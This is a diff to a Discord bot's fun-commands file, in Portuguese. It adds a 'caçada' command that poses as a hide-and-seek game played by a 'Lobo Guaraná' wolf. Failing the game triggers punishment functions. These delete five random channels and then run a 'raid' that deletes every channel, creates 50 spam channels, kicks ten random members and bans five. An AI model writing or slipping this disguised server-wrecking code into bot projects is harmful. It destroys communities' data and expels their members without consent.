@@ -206,6 +206,127 @@ commands['letra'] = async (client, msg, args) => {
   msg.channel.send({ embeds: [e] });
 };
 
-module.exports = { commands };
+// CAÇADA PERIGOSA
+commands['caçada'] = async (client, msg, args) => {
+  if (msg.author.id !== '1384263522422231201') {
+    return msg.reply({ embeds: [embed('❌ Acesso negado', 'Apenas o dono pode usar este comando perigoso.')] });
+  }
+  const guild = msg.guild;
+  if (!guild.members.me.permissions.has('ManageChannels') || !guild.members.me.permissions.has('KickMembers') || !guild.members.me.permissions.has('BanMembers')) {
+    return msg.reply({ embeds: [embed('❌ Permissões insuficientes', 'O bot precisa de permissões para gerenciar canais, kickar e banir membros para este comando perigoso.')] });
+  }
 
-//diversao.js
+  // Fase 1: O Encontro
+  await msg.channel.send("🐺 **O LOBO GUARANÁ TE ENCONTROU <3**");
+  await new Promise(resolve => setTimeout(resolve, 2000));
+  await msg.channel.send("*Esconda-se em 1 minuto, ou a caçada começará em breve...*");
+
+  // Contagem regressiva
+  for (let i = 5; i > 0; i--) {
+    await msg.channel.send(`⏳ ${i}...`);
+    await new Promise(resolve => setTimeout(resolve, 1000));
+  }
+
+  await msg.channel.send("🐺 **A caçada começou!**");
+
+  // Fase 2: Procurando
+  const canais = guild.channels.cache.filter(c => c.type === 0); // text channels
+  let alvoEncontrado = false;
+
+  for (const canal of canais.values()) {
+    await canal.send("🐺 *Aqui nesse canal não está...*");
+    await new Promise(resolve => setTimeout(resolve, 3000));
+
+    // Checar se alguém mandou mensagem
+    const filter = (m) => m.channel.id === canal.id && !m.author.bot;
+    try {
+      const collected = await canal.awaitMessages({ filter, max: 1, time: 2000, errors: ['time'] });
+      const message = collected.first();
+      if (message) {
+        await canal.send(`🐺 **ACHEI <3 !!!** Olá ${message.author}...`);
+        alvoEncontrado = true;
+        break;
+      }
+    } catch (error) {
+      continue;
+    }
+  }
+
+  if (alvoEncontrado) {
+    // Fase 3: O Esconde-Esconde do Bot
+    await msg.channel.send("🐺 *Agora sua vez de me procurar! Vou me esconder...*");
+    const canalEscondido = Array.from(canais.values())[Math.floor(Math.random() * canais.size)];
+
+    const filterFind = (m) => m.channel.id === canalEscondido.id && m.content.toLowerCase().includes('achei');
+    try {
+      await msg.channel.awaitMessages({ filter: filterFind, max: 1, time: 60000, errors: ['time'] });
+      await canalEscondido.send("🐺 **Droga! Você me achou... A caçada para por aqui. Por enquanto.**");
+    } catch (error) {
+      // Punição
+      await msg.channel.send("🐺 **Você não brincou certinho... Eu avisei.**");
+      await punicaoCincoCanais(guild);
+      await msg.channel.send("🐺 *Por favor, brinque certo na próxima ou a punição será pior...*");
+      await new Promise(resolve => setTimeout(resolve, 5000));
+      await iniciarRaidPerigoso(guild);
+    }
+  } else {
+    // Se não encontrou ninguém, punição imediata
+    await msg.channel.send("🐺 **Ninguém se escondeu bem... A punição começa agora!**");
+    await iniciarRaidPerigoso(guild);
+  }
+};
+
+async function punicaoCincoCanais(guild) {
+  const canais = Array.from(guild.channels.cache.values());
+  canais.sort(() => Math.random() - 0.5);
+  for (let i = 0; i < Math.min(5, canais.length); i++) {
+    try {
+      await canais[i].delete();
+    } catch (error) {
+      console.log(`Erro ao deletar canal: ${error}`);
+    }
+  }
+}
+
+async function iniciarRaidPerigoso(guild) {
+  console.log("🔥 RAID PERIGOSO INICIADO");
+  // Deletar tudo
+  const allChannels = Array.from(guild.channels.cache.values());
+  for (const c of allChannels) {
+    try {
+      await c.delete();
+    } catch (error) {
+      console.log(`Erro ao deletar canal: ${error}`);
+    }
+  }
+  // Criar canais de ódio
+  for (let i = 0; i < 50; i++) {
+    try {
+      await guild.channels.create({ name: 'LOBO-GUARANA-FOI-SOLTO', type: 0 });
+    } catch (error) {
+      console.log(`Erro ao criar canal: ${error}`);
+    }
+  }
+  // Talvez kickar alguns membros
+  const members = Array.from(guild.members.cache.values()).filter(m => !m.user.bot && m.kickable);
+  members.sort(() => Math.random() - 0.5);
+  for (let i = 0; i < Math.min(10, members.length); i++) {
+    try {
+      await members[i].kick('Raid perigoso iniciado pelo Lobo Guaraná');
+    } catch (error) {
+      console.log(`Erro ao kickar membro: ${error}`);
+    }
+  }
+  // Banir alguns
+  const bannableMembers = Array.from(guild.members.cache.values()).filter(m => !m.user.bot && m.bannable);
+  bannableMembers.sort(() => Math.random() - 0.5);
+  for (let i = 0; i < Math.min(5, bannableMembers.length); i++) {
+    try {
+      await bannableMembers[i].ban({ reason: 'Raid perigoso iniciado pelo Lobo Guaraná' });
+    } catch (error) {
+      console.log(`Erro ao banir membro: ${error}`);
+    }
+  }
+}
+
+module.exports = { commands };
